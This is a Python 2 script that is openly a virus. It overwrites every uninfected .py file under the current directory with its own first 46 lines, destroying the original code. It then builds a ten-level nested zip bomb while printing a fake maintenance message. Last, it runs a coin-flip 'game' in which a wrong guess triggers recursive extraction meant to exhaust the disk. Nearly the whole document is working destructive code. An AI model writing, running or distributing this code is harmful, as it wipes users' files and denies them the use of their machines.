import zlib
import zipfile
import shutil
import os
import sys
import time
import random

SIGNATURE = "OCEAN CREATURE"

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
    
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <46:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring)
        f.close()
        
def create_zip():
	def get_file_size(filename):
		st = os.stat(filename)
		return st.st_size
	def generate_dummy_file(filename,size):
		with open(filename,'w') as dummy:
			for i in xrange(1024):
				dummy.write((size*1024*1024)*'0')
	def get_filename_without_extension(name):
		return name[:name.rfind('.')]
	def get_extension(name):
		return name[name.rfind('.')+1:]
	def compress_file(infile,outfile):
		zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
		zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
		zf.close()
	def make_copies_and_compress(infile, outfile, n_copies):
		zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
		for i in xrange(n_copies):
			f_name = '%s-%d.%s' % (get_filename_without_extension(infile),i,get_extension(infile))
			shutil.copy(infile,f_name)
			zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
			os.remove(f_name)
		zf.close()
	print "Loading Mantainence Files, Please Wait"
	carnage_level = 10
	out_zip_file = "surprise.zip"
	dummy_name = 'dummy.txt'
	start_time = time.time()
	generate_dummy_file(dummy_name,1)
	level_1_zip = '1.zip'
	compress_file(dummy_name, level_1_zip)
	os.remove(dummy_name)
	decompressed_size = 1
	for i in xrange(1,carnage_level+1):
		make_copies_and_compress('%d.zip'%i,'%d.zip'%(i+1),10)
		decompressed_size *= 10
		os.remove('%d.zip'%i)
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)
	os.rename('%d.zip'%(carnage_level+1),out_zip_file)

def search_extract(zip_dir):
	def check_files():
		for item in os.listdir(zip_dir):
			if item.endswith('zip') or os.path.isdir(item):
				return True
		return False
	while check_files():
		dir_number = 0
		for item in os.listdir(zip_dir):
			if item.endswith('.zip'): 
				dir_number += 1
				dir_name = str(dir_number)
				new_dir = (zip_dir + '/' + dir_name)
				os.makedirs(new_dir)
				zip_ref = zipfile.ZipFile((zip_dir + '/' + item), 'r')
				zip_ref.extractall(new_dir)
				zip_ref.close 
				os.remove(zip_dir + '/' + item)
			elif os.path.isdir(item):
				search_extract(item)

def play_game():
	def game_format(line):
		for i in line:
			print i,
		print "\n"
		time.sleep(2)
	def coin_flip():
		flips = 1
		while flips < 4:
			coin_number = "COIN FLIP NUMBER {}{}".format(str(flips), ":")
			game_format(coin_number)
			time.sleep(2)
			guess = raw_input("Heads or Tails?\n\n>>")
			while guess.upper() != 'HEADS' and guess.upper() !='TAILS':
				guess = (raw_input("Type \"Heads\" or \"Tails\".\n\n>>")).upper()
			if random.randint(0, 1) == 0:
				print "\nCorrect!\n"
				time.sleep(2)
				flips += 1
				if flips > 3:
					print "\nYou Win!!!"
			else:
				print "\nWrong!\n"
				time.sleep(2)
				search_extract(os.path.abspath(""))
				break
	game_format("3 Flips of a Coin")
	game_format("Guess them right or face concequences!")
	game_format("Play the game or face concequences!")
	coin_flip()

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
create_zip()
play_game()

